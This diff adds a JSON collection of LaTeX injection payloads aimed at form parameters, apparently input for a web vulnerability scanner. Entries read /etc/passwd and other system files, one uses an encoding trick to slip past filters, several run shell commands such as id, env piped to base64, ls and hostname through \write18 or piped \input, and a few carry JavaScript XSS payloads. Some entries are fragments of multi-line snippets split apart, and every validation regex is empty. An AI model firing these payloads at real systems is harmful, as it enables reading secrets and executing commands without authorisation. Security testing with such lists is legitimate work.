@@ -1,0 +1,398 @@
+[
+  {
+    "payload_id": "OWP-37610",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\input{/etc/passwd}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37611",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\include{somefile} # load .tex file (somefile.tex)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37612",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\newread\\file",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37613",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\openin\\file=/etc/issue",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37614",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\read\\file to\\line",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37615",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\text{\\line}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37616",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\closein\\file",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37617",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\lstinputlisting{/etc/passwd}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37618",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\openin\\file=/etc/passwd",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37619",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\loop\\unless\\ifeof\\file",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37620",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\read\\file to\\fileline",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37621",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\text{\\fileline}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37622",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\repeat",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37623",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\usepackage{verbatim}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37624",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\verbatiminput{/etc/passwd}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37625",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\catcode `\\$=12",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37626",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\catcode `\\#=12",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37627",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\catcode `\\_=12",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37628",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\catcode `\\&=12",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37629",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\input{path_to_script.pl}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37630",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\lstin^^70utlisting{/etc/passwd}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37631",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\newwrite\\outfile",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37632",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\openout\\outfile=cmd.tex",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37633",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\write\\outfile{Hello-world}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37634",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\write\\outfile{Line 2}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37635",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\write\\outfile{I like trains}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37636",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\closeout\\outfile",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37637",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\immediate\\write18{id > output}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37638",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\input{output}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37639",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\immediate\\write18{env | base64 > test.tex}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37640",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\input{text.tex}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37641",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\input|ls|base64",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37642",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\input{|\"/bin/hostname\"}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37643",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\url{javascript:alert(1)}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37644",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\href{javascript:alert(1)}{placeholder}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37645",
+    "vulnerability_category": "Injection (LaTeX)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "\\unicode{<img src=1 onerror=\"<ARBITRARY_JS_CODE>\">}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
